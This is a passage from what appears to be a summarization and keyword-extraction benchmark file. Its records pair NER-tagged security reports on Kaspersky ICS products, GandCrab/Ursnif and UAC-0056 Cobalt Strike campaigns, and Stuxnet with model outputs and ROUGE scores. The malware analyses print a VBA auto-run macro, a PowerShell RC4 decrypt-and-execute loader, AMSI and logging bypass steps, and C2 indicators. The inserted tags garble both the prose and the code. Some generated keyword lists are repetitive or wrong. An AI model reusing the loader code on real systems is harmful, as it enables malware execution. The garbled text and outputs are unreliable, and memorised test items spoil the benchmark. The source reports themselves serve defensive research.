the industrial network . Wi - Fi network control This enables the monitoring of any attempt to connect to unauthorized Wi - Fi networks . The Wi - Fi Control task is based on [ORG] Default [ORG] Deny technology , which implies automatically blocking connections to any Wi - Fi network \u201c not allowed \u201d in the task settings . PLC integrity check This enables additional control over [ORG] PLC configurations via periodical checks against a selected , [ORG] Kaspersky - secured server . The resulting checksums are compared against saved \u201c Etalon \u201d values , and any deviations are reported.8File Integrity Monitor This feature is designed to track actions performed within specified files and folders in the monitoring scopes specified in the task settings . You can use it to detect file changes that may indicate a security breach on the protected server \u2013 like changes to [GPE] SCADA projects stored on a [ORG] SCADA server . Advanced anti - malware protection [ORG] Kaspersky \u2019s best - in - class proactive malware detection and prevention technologies are adapted and re - designed to meet heavy resource consumption and system availability requirements . Our advanced anti - malware protection is designed to work effectively even in static or rarely updated environments . Kaspersky \u2019s anti - malware covers the full spectrum of technologies , including : In - memory ( resident ) detection.\u2022 Signature based malware detection . \u2022 On - access and on - demand detection . \u2022 \u2022 Ransomware detection via special Anti - Cryptor technology . \u2022 [ORG] Kaspersky [ORG] Security [ORG] Network ( [ORG] KSN ) and [ORG] Kaspersky [ORG] Private [ORG] Security [ORG] Network ( [ORG] KPSN ) , enabling the ultimate malware detection service . Trusted updates To ensure [ORG] Kaspersky security updates have no impact on the availability of the protected system , compatibility checks are performed prior to both database / component releases and process control system software / configuration updates . Potential resource consumption issues can be addressed through a number of different scenarios:\u2022 [PERSON] Kaspersky performs database update compatibility tests with industrial automation vendor software on the [ORG] Kaspersky test bed.\u2022 Your IAV performs compatibility checks . \u2022 Kaspersky checks security database updates for you : SCADAserver , workstation and [ORG] HMI images are integrated into [ORG] Kaspersky \u2019s test bed.\u2022 [PERSON] Kaspersky security updates are tested on your site andautomated via [ORG] Kaspersky [ORG] Security Center.9Kaspersky Industrial CyberSecurity for NetworksAs an industrial anomaly and breach detection software , [ORG] KICS for Networks operates at the industrial communication protocol ( [ORG] Modbus , [ORG] IEC stack , [ORG] ISO , etc ) layer , analyzing industrial traffic for anomalies via advanced [ORG] DPI ( Deep Packet inspection ) technology . Network integrity control and IDS capabilities are also provided . [ORG] KICS [ORG] for [ORG] Networks also helps to solve non - security issues by asset discovery and network map visualization . Threats and risks factorsKaspersky technologiesAppearance of unauthorized network devices on industrial networkNetwork [ORG] Integrity [ORG] Control detects new / unknown devices Asset discovery , Network mapAppearance of unauthorized communications on industrial networkNetwork [ORG] Integrity [ORG] Control monitors communications between known / unknown devices Asset discovery , [ORG] Network [ORG] mapMalicious [ORG] PLC commands by : \u2022 Operator or [ORDINAL] 3rd party(e.g . contractor ) in [GPE] error\u2022 [GPE] Insider ( fraud actions ) \u2022 Attacker / MalwareTechnological DPI analyzes communications to and from PLCs and control of the commands and parameter values of the technological process . Network attacksAn [ORG] Advanced [ORG] Intrusion [ORG] Detection [ORG] System identifies all known network attack patterns , including the exploitation of vulnerabilities in industrial software and hardware Events correlationsLack of data for investigation and forensicsForensics tools : monitoring and safe logging of suspicious industrial network events and detected attacksNon - intrusive industrial network traffic inspection [ORG] KICS for Networks delivers passive network traffic monitoring of anomalies and network security while remaining invisible to potential attackers . Installation is as simple as enabling/ configuring port mirroring ; easy integration of the software/ virtual or hardware appliance into existing industrial network equipment is achieved via the [ORG] SPAN port of the existing switch or TAP device . [ORG] KICS for [GPE] Networks has a modular architecture \u2013 sensors can be deployed separately from a central control unit.10Industrial DPI for anomaly detection [ORG] KICS for Networks supplies industrial users with a trusted platform for monitoring process control command flow and telemetry data , enabling , among other things:\u2022 Detection of any command which would reconfigure a [ORG] PLCor change the [ORG] PLC state.\u2022 Control parameter changes in technology processes . \u2022 Protection against outside threats while mitigating the risk of \u201c advanced \u201d insider interference from engineers , [ORG] SCADA operators or other internal staff with direct access to systems . Machine Learning Our industrial DPI can not only be configured by a standard rule- based approach \u2013 it can also detect anomalies inside industrial processes via a powerful LSTM - based forecasting model . Machine learning capability brings industrial anomaly detection to a new level , making incident discovery possible in the most complex and frequently reconfigured industrial networks . Network integrity control for security and assets inventory [ORG] KICS for [GPE] Networks enables the identification of all [PERSON] Ethernet connected network assets \u2013 including [ORG] SCADA servers , HMIs , engineering workstations , PLCs , IEDs and RTUs . All new or unknown devices and their communications are detected automatically . This gives security teams the capacity to develop their own reliable , secure network asset inventory , rather than using potentially vulnerable OT / IT asset management tools which are highly targeted by attackers . Forensic tools [ORG] Kaspersky \u2019s solution gives industrial users a safe logging system , which provides tools for data analysis and digital forensics . The system also prevents any changes to [ORG] ICS logs.11Additional services for [ORG] Kaspersky [ORG] Industrial [ORG] CyberSecurity [ORG] Kaspersky [ORG] Security [ORG] Network [ORG] Kaspersky [ORG] Security [ORG] Network ( [ORG] KSN ) is a cloud - based , complex distributed architecture dedicated to gathering and analyzing security threat intelligence from [CARDINAL] millions of nodes worldwide . KSN not only detects and blocks the newest threats and zero - day attacks , but also helps locate and blacklist online attack sources , providing reputational data for websites and applications . All Kaspersky corporate solutions , including industrial solutions , can be connected to [ORG] KSN if required . Key benefits include:\u2022 Superior detection rates . \u2022 Reduced reaction times \u2013 traditional signature - basedresponses take [TIME] hours : [ORG] KSN responds in [CARDINAL] about [CARDINAL] 40 seconds.\u2022 Lower false positive rates . \u2022 Reduced resource consumption for on - premise securitysolutions . [ORG] Kaspersky [ORG] Private [ORG] Security [ORG] Network ( KPSN)For organizations that have very specific data privacy concerns , [ORG] Kaspersky has developed [ORG] the [ORG] Kaspersky [ORG] Private [ORG] Security [ORG] Network option . It provides almost all the advantages of [ORG] KSN , but without sending any information whatsoever outside the network . [ORG] KPSN can be deployed within any organization \u2019s own data center , where in - house IT specialists retain complete control over it . Local [ORG] KPSN installations can help meet country - specific compliance requirements or other industry - specific legislation . [PERSON] Key [PERSON] KPSN functions:\u2022 File and URL reputation services : MD5 hashes for files , regularexpressions for URLs and malware behavior patterns are centrally stored , categorized and rapidly deployed to [ORG] client\u2022 [ORG] Record [ORG] Management [ORG] System ( RMS ): Sometimes securitysoftware makes mistakes and incorrectly categorizes files or URLs as trusted / not trusted . RMS acts as a \u201c false positives \u201d deterrent , rectifying errors as well as continuously analyzing to improve [PERSON] quality\u2022 [PERSON] Cloud - based intelligence and information.12Kaspersky Industrial [ORG] CyberSecurity is a portfolio of technologies and services designed to secure operational technology layers and elements of your organization - including [ORG] SCADA servers , HMIs , engineering workstations , PLCs , network connections and even engineers - without impacting on operational continuity and the consistency of industrial process . [ORG] Learn more at [DATE] www.kaspersky.com/icsAll about [ORG] ICS cybersecurity : url Threats News : www.securelist.com#Kaspersky # [PRODUCT] BringontheFuture", "generated_text": "Kaspersky Industrial CyberSecurity; 2019; four industrial companies; an ICS cyberattack; 77 %; companies; cybersecurity as a major priority; use; attacks; OT systems; information technology; the threat; ransomware; a broad range; malware; techniques; network access; automation; processes; the risk; access; a network; an industrial control system; the future; threats; Ethical management; an organization; cyberthreats; opportunities; operations; legal action; companies; the high risk; attack potential; data loss; recordkeeping; critical infrastructure systems; endpoints; cybersecurity solutions.", "ref_text": "<START-1>The document provides an overview of Kaspersky's industrial cybersecurity solutions for protecting critical infrastructure and industrial control systems. It highlights the increasing threats to these operational technology systems, including targeted attacks, ransomware, and vulnerabilities being exploited. Kaspersky offers specialized security services for industrial systems such as assessments, training, threat intelligence, and incident response. Its main product is Kaspersky Industrial CyberSecurity (KICS) which has centralized security management, and modules for endpoint protection, network monitoring, and anomaly detection. KICS for Nodes secures endpoints with whitelisting, anti-malware, firewalls, and integrity checks tailored for industrial software. KICS for Networks passively monitors network traffic for anomalies and attacks using deep packet inspection and machine learning. Additional features include asset discovery, network visualization, forensic tools, and integration with HMIs. Kaspersky's solutions are designed specifically for industrial cybersecurity needs, ensuring continuity of critical processes. They aim to provide visibility, access control, advanced threat detection, and secure remote management across IT and OT systems. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4086687306501548, "gpt3/lexical/rouge_rouge2": 0.14330218068535827, "gpt3/lexical/rouge_rougeL": 0.17956656346749225, "gpt3/lexical/rouge_rougeLsum": 0.17956656346749225, "gpt3_generated_text": ["The article discusses the increasing threat of cyber attacks on industrial systems and the importance of cybersecurity in the industrial sector. It highlights that three in four industrial companies believe they will experience an ICS cyber attack and that 77% of companies rank cybersecurity as a major priority. The disruption of operations is identified as the most critical consequence of a cyberattack for industrial companies. Industrial systems are categorized into two domains: Information Technology (IT) and Operational Technology (OT), with cybersecurity strategies for OT systems focusing on the continuity of industrial processes. The article emphasizes that traditional IT cybersecurity solutions are not suitable for OT systems, as they put the availability and integrity of processes at risk. The risks and threats to industrial control systems include generic malware attacks, ransomware, and targeted attacks such as Stuxnet and BlackEnergy. The article concludes by highlighting the growing need for industrial cybersecurity solutions to protect against these threats and ensure the safety and reliability of industrial processes."]}, {"split_name": "test", "sample_id": "test_53", "prompt_text": "Extract the keywords: Carbon Black TAU & ThreatSight Analysis : [NORP] GandCrab and [GPE] Ursnif Campaigncarbonblack.com/2019/01/24/carbon-black-tau-threatsight-analysis-gandcrab-and-ursnif-campaign/January 24 , [DATE] 2019January 24 , [DATE] 2019 / Carbon Black Threat Analysis UnitSummary ( [ORG] Analysis conducted by [PERSON] Andrew [PERSON] Costis , [PERSON] Cathy [PERSON] Cramer , [PERSON] Emily [PERSON] Miner and [ORG] Jared [ORG] Myers.)The [ORG] Carbon [ORG] Black [ORG] ThreatSight team observed an interesting campaign over [DATE] the [DATE] last [DATE] month . ThreatSight worked with [ORG] the [ORG] Threat [ORG] Analysis [ORG] Unit ( [ORG] TAU ) to research the campaign . This report is being released to help researchers and security practitioners combat this campaign as new samples are being discovered in the wild daily . This attack , if successful , can infect a compromised system with both [GPE] Ursnif malware and [PRODUCT] GandCrab ransomware . The overall attack leverages several different approaches , which are popular techniques amongst red teamers , espionage focused adversaries , and large scale criminal campaigns.1/11This campaign originally came in via phishing emails that contained an attached Word document with embedded macros , [PERSON] Carbon [PERSON] Black located [CARDINAL] roughly [CARDINAL] 180 variants in the wild . The macro would call an encoded [ORG] PowerShell script and then use a series of techniques to download and execute both a [PERSON] Ursnif and [ORG] GandCrabvariant . This campaign has been discussed at a high level by other researchers publicly . The image below provides a high level overview of the attack chain . [PERSON] Carbon [PERSON] Black product specific content can be located in [ORG] the [ORG] User [ORG] Exchange . Figure [CARDINAL] 1 : [ORG] Attack [ORG] OverviewTechnical [ORG] FindingsCarrier [ORG] File In this campaign the attackers used a MS Word document ( .doc format ) to deliver the initial stages . It should be noted that out of the roughly [CARDINAL] 180 Word variants that were located by [PERSON] Carbon [PERSON] Black , the biggest difference in the documents was the metadata and junk data located in the malicious macros . However the metadata clearly showed that the documents prepared for this campaign were initially saved on [DATE] December 17 , [DATE] 2018 and have continued to be updated through [DATE] January 21 , [DATE] 2019 . Several metadata fields ( specifically title , subject , author , comments , manager , and company ) appear to have been populated with different data2/11sets . For example the subject in all the samples was a combination of a [GPE] US state and a common [ORDINAL] first name ( like [ORG] Utah [ORG] Erick or [PERSON] Tennessee [PERSON] Dayna ) . For this post the following sample of code . The vast majority of that was junk code , the below images represent a high level visualization the script itself . Figure [CARDINAL] 2 : VBScript OverviewOnce the junk code was removed from the VBScript , there are [CARDINAL] approximately [CARDINAL] 18 lines of relevant code , which ultimately call a shape box in the current document . The variable names themselves are not relevant , however the methods in bold below will retrieve the [ORG] AlternativeText field from the specified shape , which is then executed . Sub AutoOpen()Set QWxwqfqgHttm = [ORG] ThisDocumentSet [ORG] FXpVcBPxzVsJ = QWxwqfqgHttm . Shapes(\u201c4obka2etp1318a\u201d)faaQXNtRqmxB = FXpVcBPxzVsJ.AlternativeTextnpNsCwDavJ = Array(HpTNHpSpmZgp , BlmmaRvZMLP , tRzpZFwJWJcCj , tPJRanNbKWZPrd , Interaction@.Shell(CleanString(faaQXNtRqmxB ) , [CARDINAL] 231 * [CARDINAL] 2 + -462 ) , [PERSON] RfjXGpzMtcrz , hfbZCRXCJQPJQ)Table [CARDINAL] 2 : Relevant VBScript codeThe alternate text can easily be observed in the body of the office document . The area highlighted in blue is the shape name that is being located , while the text itself is highlighted in red . It is clear that the text is a base64 encoded command , that is then executed by the above VBScript.3/114/11Figure 3 : Alternative TextSecond Stage The [ORG] PowerShell script will [ORDINAL] first create an instance of the .Net Webclient class and then enumerate the available methods using the [ORG] GetMethods ( ) call ( highlighted in the image in red ) . The enumerated methods are stored , then a for loop looks [ORDINAL] first for the method named [ORG] DownloadString ( highlighted in blue).If the [ORG] DownloadString method is located it will contact the hard coded [CARDINAL] C2 requesting a file , which is downloaded and then invoked ( highlighted in blue ) . It should be noted that because the requested resource is being stored as a string and executed , this all occurs in memory . Additional Analysis of the downloaded string is provided in the [NORP] Gandcrab cradle section below . The loop then looks for the method name [ORG] DownloadData , and if located will download a resource from a [ORDINAL] second C2 . This request is then stored in the CommonApplicationData directory ( C:\\ProgramData in [ORG] Vista and later ) as the hard coded file name ( highlighted in green ) . The script will utilize the hard coded [ORG] DCOM object C08AFD90 - F2A1 - 11D1 - 8455- 00A0C91F3880 , which is the ClassID for the ShellBrowserWindow . A previous blog post by enigma0x3 , detailed how this CLSID can be leveraged to instantiate the ShellBrowserWindow object and call the [PRODUCT] ShellExecute method , which is the same approach that was taken by the attackers . This approach has also been used in different [GPE] Empire modules.5/11Figure [CARDINAL] 4 : PowerShell ScriptPayloads The payloads that are downloaded in the above steps are then executed on the system . GandCrab [PRODUCT] CradleThe [ORDINAL] first payload that is downloaded via the [ORG] DownloadString method highlighted above , is a [ORG] PowerShell [CARDINAL] one - liner that uses an IF statement to evaluate the architecture of the compromised system , and then downloads a additional payload from pastebin.com . This additional payload is then executed in memory . The image below depicts the contents of the [PERSON] o402ek2m.php file . It should be noted that the contents of o402ek2m.php were updated by the attackers to reference different pastebin uploads throughout this campaign . Also updated was the function name that is invoked , in the example below it was [PERSON] CJOJFNUWNQKRTLLTMCVDCKFGG , however this was dynamically changed to match the name of the function that would be present in pastebin file that was being downloaded . Figure [CARDINAL] 5 : [ORG] PowerShell Cradle6/11Once the raw contents of the pastebin.com post were downloaded , that data would also be executed in memory . In the variants that were obtained during this campaign the file contained a [ORG] PowerShell script that was approximately [CARDINAL] 2800 lines . This [ORG] PowerShell script is a version of [ORG] the [ORG] Empire Invoke - PSInject module , with very few modifications . The majority if the modifications are of removing comments and renaming variables . The script will take an embedded [ORG] PE file that has been base64 encoded and inject that into the current [ORG] PowerShell process . The image below is the main function that is being called which in turns calls the function responsible for injecting the embedded [ORG] PE file . Figure [CARDINAL] 6 : [ORG] PowerShell reflective injection scriptThe base64 encoded [ORG] PE file that can be seen in line [DATE] 2760 of the image above is a GandCrab Ursnif executable . In this instance it is saved to the C:\\ProgramData directory with a pseudo random name . It should be noted that the file name was changed throughout this campaign . Once executed the [PERSON] Ursnif sample will conduct the typical actions observed in [GPE] Ursnif samples , like credential harvesting , gathering system and process information , and deploying additional malware samples . The information for this specific sample is listed below . However , numerous [GPE] Ursnif variants were hosted on the bevendbrec.com site during this campaign . [PERSON] Carbon [PERSON] Black was able to discover approximately [CARDINAL] 120 different [GPE] Ursnif variants that While researching this campaign [CARDINAL] approximately [CARDINAL] 180 variants were located in the wild . Using the VirusTotal Graph functionality these variants could be organized into several groups that were commonly associated by either metadata or document structures like macros or embedded image files ( depicted in the image below ) . The variants directly related to this analysis was extracted and expanded in Figure 8.8/11Figure [CARDINAL] 7 : Campaign related Word documentsThe image below highlights the nodes associated with the samples analyzed in this report . The graph can also be viewed in the VTGraph Console for additional exploration . The graph highlights the [CARDINAL] at [CARDINAL] least [CARDINAL] 3 different variants of [GPE] Ursnif that were being hosted on the bevendbrec[.]com site . As well as the [ORG] PowerShell cradle and [ORG] PS [ORG] Empire script that would inject the [NORP] Gandcrab sample into memory can be observed in the graph below.9/11Figure [CARDINAL] 8 : Analyzed document isolated relationshipsThe [GPE] Ursnif variants that were located in the wild are highlighted in the image below . The variants were primarily grouped by C2 infrastructure . The large grouping on the right of the diagram are direct variants of the sample referenced in this write up . Samples in this grouping were all hosted on sites that were called by the [ORDINAL] second stage . The samples had minor changes , and were presumably changed by the attackers to avoid detection by hash.10/11Figure [CARDINAL] 9 : Campaign related Ursnif samplesIOCs The IOCs for this blog post can be found on [PERSON] Carbon [PERSON] Blacks [PERSON] Github repo . IOCs here and [PERSON] Yara [PERSON] Sigs here.11/11", "generated_text": "ThreatSight; Carbon Black; GandCrab; the campaign; emails; Word documents; phishing emails; a macro; PowerShell; the malware; Ursnif; GandCrab ransomware; a compromised system; the malware; files; the macros; the malware; C2; DLL; JavaScript; the PowerShell script; UDP; a command; control; servers; The macros; the VBScript; a command; execution; commands; Run; the C2 server; a command; execution; a DLL; the attackers; the malware; the victim; the attacker; the target; the C2 server; the malware; the C2 server; execution; the C2 server; the C2 server; a compromised system; the C2 server; a C2 server; the C2 server; all the samples; the malware; other techniques.", "ref_text": "<START-1>The PDF analyzes a campaign distributing both Ursnif malware and GandCrab ransomware via malicious Word documents. The campaign started in December 2018, using Word docs with embedded macros that execute a PowerShell script when opened. Over 180 variants were observed. The PowerShell script contains two main functions - one using DownloadString to retrieve a GandCrab loader script, and one using DownloadData to retrieve a Ursnif executable. The GandCrab loader injects a GandCrab ransomware executable into the PowerShell process for execution. The Ursnif exe performs credential theft and deploying other malware. Metadata analysis shows the Word docs were continuously updated between December and January, with random metadata fields likely to avoid detection. Approximately 120 Ursnif variants were hosted for download during the campaign, primarily grouped by command and control infrastructure similarities. The campaign demonstrates the effectiveness of macro Word docs to distribute malware like info-stealers and ransomware to compromise systems. All the major components of the attack chain are analyzed. IOCs, Yara rules, and VT Graph analysis are provided to aid detection and linking of related samples. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4574780058651027, "gpt3/lexical/rouge_rouge2": 0.10029498525073748, "gpt3/lexical/rouge_rougeL": 0.22873900293255134, "gpt3/lexical/rouge_rougeLsum": 0.22873900293255134, "gpt3_generated_text": ["The Carbon Black Threat Analysis Unit (TAU) and ThreatSight team have conducted an analysis of a recent campaign involving the Ursnif and GandCrab malware. The campaign starts with phishing emails containing Word documents with embedded macros. Carbon Black discovered approximately 180 variants of these documents in the wild. The macros call an encoded PowerShell script, which then downloads and executes both Ursnif and GandCrab variants. The attackers used various techniques, such as metadata manipulation and junk code, to obfuscate the macros. The PowerShell script uses a shape box in the document to execute a base64 encoded command. The script then creates an instance of the .Net WebClient class to download and invoke a file from a hardcoded command and control (C2) server. The downloaded file is executed in memory. This campaign highlights popular techniques used by red teamers, espionage-focused adversaries, and large-scale criminal campaigns. Researchers and security practitioners are advised to stay vigilant as new samples of this campaign are constantly being discovered."]}, {"split_name": "test", "sample_id": "test_54", "prompt_text": "Extract the keywords: Cobalt Strikes again : [PERSON] UAC-0056 continues to target [GPE] Ukraine in its latest campaignblog.malwarebytes.com/threat-intelligence/2022/07/cobalt-strikes-again-uac-0056-continues-to-target-ukraine-in-its-latest-campaign/July [CARDINAL] 13 , 2022This blog was authored by [PERSON] Roberto [PERSON] Santos and [PERSON] Hossein [PERSON] JaziThe [PERSON] Malwarebytes Threat Intelligence team recently reviewed a series of cyber attacks against [GPE] Ukraine that we attribute with high confidence to [GPE] UAC-0056 ( [ORG] AKA [ORG] UNC2589 , [ORG] TA471 ) . This threat group has repeatedly targeted the government entities in [GPE] Ukraine via phishing campaigns following the same common tactics , techniques and procedures ( TTPs).Lures are based on important matters related to the ongoing war and humanitarian disaster happening in [GPE] Ukraine . We have been closely monitoring this threat actor and noticed changes in their macro - based documents as well as their final payloads . In this blog , we will connect the dots between different decoy samples that we and others such as [ORG] Ukraine [ORG] CERT have observed . We will also share indicators for a previously undocumented campaign performed by the same threat actor at [DATE] the [DATE] end [DATE] of [DATE] June . Different themes , same techniques Since the publication of our blog [ORG] post There \u2019s [ORG] a [ORG] Go [ORG] Elephant in the room , we have tracked several new samples as can be seen in the timeline below : Figure [CARDINAL] 1 : Relations between different UAC-0056 attributed samplesLet \u2019s dig further into those relationships . [ORG] UA - [ORG] CERT has attributed the document named \u201c Information on the availability of vacancies and their staffing.xls \u201d to [GPE] UAC-0056 . This file looked familiar to us and for good reason because the macro is nearly identical to the document we analyzed in our initial blog : In the most recent attack reported by [ORG] UA - [ORG] CERT ( [NORP] Humanitarian catastrophe of [GPE] Ukraine since [DATE] February [DATE] 24 , 2022.xls ) we see an almost identical macro to the one used in another decoy document called Help Ukraine.xls : Figure [CARDINAL] 2 : [PERSON] Detail of [ORG] Vacancies and [PERSON] GoElephant dropper macrosThe Help [GPE] Ukraine lure , to our knowledge , has never been publicly documented before : Figure [CARDINAL] 3 : Detail of Help Ukraine and [NORP] Humanitarian catastrophe macrosWe were able to identify [CARDINAL] 7 different samples with that theme , including [CARDINAL] one domain named excel - vba[.]ru . Figure [CARDINAL] 5 : Similarities between different versionsFigure [CARDINAL] 6 : Similarities between different versions ( 2)Among victims , we find gov.ua emails being targeted . [CARDINAL] One of the texts used as email body in the last campaign was written in [GPE] Ukrainian and translates to : On [DATE] February [DATE] 24 , [DATE] 2022 , the army of the terrorist state \u2013 [GPE] the [GPE] Russian [GPE] Federation , intervened on the territory of [GPE] Ukraine . In order to counter the propaganda of the [NORP] Russian government , [ORG] the [ORG] State [ORG] Department [ORG] of [ORG] Statistics at [ORG] the [ORG] Office [ORG] of [ORG] the [ORG] President [ORG] of [GPE] Ukraine prepared a consolidated report on the dead citizens of [GPE] Ukraine , on the citizens of [GPE] Ukraine who were left without a home , on the citizens of [GPE] Ukraine who lost their jobs , on the number of destroyed homes , on the number of destroyed businesses as a result of an act of aggression . This report shows all the data broken down by regions of [GPE] Ukraine . Familiarize yourself and familiarize your colleagues with the real state of affairs . Glory to Ukraine!Translation of original email sent to victimsWe will focus our analysis on these [CARDINAL] 3 newer templates . Exact names and paths are from The analysis is still valid for the others , while minor changes exist between samples.write.bin The document will download an executable file named write.bin . Other attacks following the same scheme used different names for this file , including [ORG] Office.exe , baseupd.exe and DataSource.exe . The file is slightly obfuscated , and performs the following actions : Establishing persistenceAfter some antidebug tricks , the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Check [ORG] License is used to establish persistence . HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update Checker , is checked first because that was the key used by previous versions of the malware . Dropping next stage [ORG] Next step is dropping a file in C:\\ProgramData\\TRYxaEbX. This file will be used later . Figure [CARDINAL] 7 : Run key for persistenceThe payload will execute the following powershell [PERSON] Base64 encoded command : Figure [CARDINAL] 8 : Powershell commandline shown in [ORG] IDA [ORG] ProJABBADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEkATwAuAEYAaQBsAGUAXQA6ADoAUgBlAGEAZABBAGwAbABCAHkAdABlAHMAKAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0AThe chunk before is [PERSON] Base64 encoded ; which decodes to:96951aa5 - 4fab-4188 - ad33 - d72fcaa7aafe.png ( 565\u00d7466)Figure 9 : Write executable creating the previous detailed powershell command$A1 = [ System . IO.File]::ReadAllBytes(\"C:\\ProgramData\\TRYxaEbX\");$A={$W,$Y=$Args;$X=0 255;0 255|%{$Z=($Z+$X[$_]+$Y[$_%$Y.Length])%256;$X[$_],$X[$Z]=$X[$Z],$X[$_]};$W|%{$U= ( $ U+1)%256;$V=($V+$X[$U])%256;$X[$U],$X[$V]=$X[$V],$X[$U];$_-bxor$X[($X[$U]+$X[$V])%256]}};$C = ( & $ A $ [MONEY] A1 $ [ORG] B1);$E = ( New - Object [ORG] -TypeName [ORG] System . Text . UTF8Encoding).GetString($C,0,$C.Length);$E = $ [MONEY] E -Split [ Environment]::NewLine;foreach($EE in [MONEY] $ E){iex [MONEY] $ ( $ EE+\";\");};In short the file dropped in C:\\ProgramData\\TRYxaEbX will be decrypted using [ORG] CmAJngvdDmiTjLxN as key using the RC4 algorithm . This next [ORG] PowerShell script will look like : Here we can see some of the actions that will be taken : Figure [CARDINAL] 10 : Decoded [ORG] PowerShell stageDisable script logging Disable Module Logging Disable Transcription Disable AMSI protectionAfter this step , another [PERSON] Base64 payload is decoded and executed : Cobalt Strike payload deployedFigure [CARDINAL] 11 : Final PowerShell scriptAs it can be seen , the main functionality provided by this [ORDINAL] second [ORG] PowerShell file is to inject shellcode . This shellcode can be [CARDINAL] 32 or 64 bit , and is a [PERSON] MSSP1 ; rv:11.0 ) like Gecko_10984gapHttpPostUri \u2013 /nBz07hg5l3C9wuWVCGV-5xHHu1amjf76F2A8i / avp / amznussraps / Watermark \u2013 [CARDINAL] 1580103824By having a Cobalt Strike instance running on the victim \u2019s machine , it is now fully compromised . [ORG] Attacker probes the sandboxAt the time of writing , malicious [ORG] C&C servers seem to be down . However , on [DATE] July [DATE] 5 we saw active servers and successful connections to our test environment . The attackers actively sent reconnaissance commands to the machine , listing the content of several folders . We were able to decode the network communications using Didier Steven \u2019s excellent collection of Cobalt Strike tools . We consider these actions preliminary moves to check whether the machine is a viable target or not before following up with other actions . Figure [CARDINAL] 12 : Cobalt Strike communication decodedAttribution to UAC-0056Based on recent attacks reported by [ORG] CERT [ORG] UA , as well as the similarities indicated at the beginning of the blog , we can attribute this attack with used to connect the attack to other groups . For instance , the public key should be unique among deployments , according to the [ORG] CobaltStrike documentation . However , it is important to note that in that case we can not simply rely on a public key to attribute the sample we analyzed in this report . In fact , these signatures have been attributed to many different groups . Our assessment is that the group used a leaked version of Cobalt Strike and used the same private key as others , making attribution harder . [GPE] Malwarebytes users were protected against this campaign thanks to our Anti - Exploit layer . IOCs syriahr[.]eu / s / Xnk75JwUcIebkrmENtufIiiKEmoqBN / field - keywords/ syriahr[.]eu / nzXlLVas - VALvDh9lopkC / avp / amznussraps/", "generated_text": "Malwarebytes; UAC-0056; UNC2589; TA471; campaigns; Ukraine; the government entities; phishing campaigns; techniques; the macro; Humanitarian catastrophe; Ukraine emails; the Russian government; analysis; the targets; the campaign; the Macro; use; the 2014 campaign; APK; the campaigns; targets; a spearphishing email; a second phishing email; a third email; a second email; the Cobalt Strikes; a third email; the Activity; the phishing emails; data; the third email; the second email; this second email; The Attack; this second email; an open source web server; the commands; a second email; the second email; a third email; the third email; the third email; the second email; the third email; analysis; the second email; a second email; the third email; the second email; the third email; the fourth email; the third email; the second email; the third email; the third email; the second email; the fourth email; the second email; the second email; the third email; the first email; the first email; the", "ref_text": "<START-1>The report analyzes recent phishing campaigns targeting Ukraine attributed to the threat actor UAC-0056 (also known as UNC2589 and TA471). UAC-0056 leverages war-themed lures to distribute macro-laden Excel documents that drop malware. The macros download an executable that establishes persistence and executes obfuscated PowerShell scripts. The PowerShell stages ultimately install a Cobalt Strike beacon for remote access. UAC-0056 regularly updates its malware but retains certain tactics, techniques, and procedures. The report connects multiple phishing documents referencing humanitarian aid, job vacancies, and war statistics in Ukraine. Though the lures vary, code analysis reveals similarities in the VBA macros and infrastructure. Cobalt Strike payloads also contain consistent signatures, further tying the activity together. By thoroughly documenting UAC-0056's latest campaigns, the analysis aims to support Ukrainian defense efforts against this persistent threat actor. Ongoing tracking of the group's malware and infrastructure is key to detecting new attacks. The report demonstrates UAC-0056's reliance on social engineering and commodity malware to infiltrate sensitive targets amid the fog of war. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.44512195121951215, "gpt3/lexical/rouge_rouge2": 0.14110429447852757, "gpt3/lexical/rouge_rougeL": 0.2560975609756097, "gpt3/lexical/rouge_rougeLsum": 0.2560975609756097, "gpt3_generated_text": ["The Malwarebytes Threat Intelligence team has identified a series of cyber attacks targeting Ukraine, which they attribute to the threat group UAC-0056 (also known as UNC2589 or TA471). The attacks primarily target government entities in Ukraine through phishing campaigns that exploit the ongoing war and humanitarian crisis in the country. The threat actor has made changes to their macro-based documents and payloads in their latest campaign. The article provides an analysis of the different decoy samples used by UAC-0056 and shares indicators of a previously undocumented campaign by the same threat actor. The article also highlights the similarities between different versions of the decoy documents and the techniques used in the attacks. The attacks involve the use of malicious macros that download and execute files, establish persistence, and drop additional payloads. The article provides details on the actions performed by the malware and the indicators of compromise associated with the campaign."]}, {"split_name": "test", "sample_id": "test_55", "prompt_text": "Extract the keywords: Stuxnet Under the [ORG] MicroscopeRevision 1.31Aleksandr [ORG] Matrosov , Senior Virus ResearcherEugene Rodionov , Rootkit [PERSON] AnalystDavid [PERSON] Harley , Senior Research FellowJuraj Malcho , Head of Virus LaboratoryContents21INTRODUCTION 51.1TARGETED ATTACKS [CARDINAL] 51.2STUXNET VERSUS AURORA 71.3STUXNET REVEALED 111.4STATISTICS ON THE SPREAD OF THE STUXNET WORM [CARDINAL] 152 [ORG] MICROSOFT , [PERSON] MALWARE [PERSON] AND THE MEDIA 172.1SCADA , SIEMENS AND STUXNET 172.2STUXNET TIMELINE 193 DISTRIBUTION 243.1THE LNK EXPLOIT [CARDINAL] 243.1.1 Propagation via [ORG] External [ORG] Storage [ORG] Devices [CARDINAL] 273.1.2 [GPE] Metasploit and WebDAV Exploit [CARDINAL] 273.1.3 What Do DLL Hijacking Flaws and [ORG] the [ORG] LNK [ORG] Exploit have in Common ? 283.2LNK VULNERABILITY IN STUXNET [CARDINAL] 293.3THE MS10 - 061 ATTACK VECTOR 313.4NETWORK SHARED FOLDERS AND [ORG] RPC [ORG] VULNERABILITY ( MS08 - 067 ) 343.50 - DAY [DATE] IN [DATE] WIN32K.SYS ( MS10 - 073 ) [CARDINAL] 353.6 MS10 - 092 : EXPLOITING A [DATE] 0 - DAY IN TASK SCHEDULER 404STUXNET IMPLEMENTATION 454.1USER - MODE FUNCTIONALITY 454.1.1 Overview of the main module 454.1.2Injecting code [CARDINAL] 464.1.3Injecting into a current process [CARDINAL] 474.1.4Injecting into a new process 504.1.5Installation 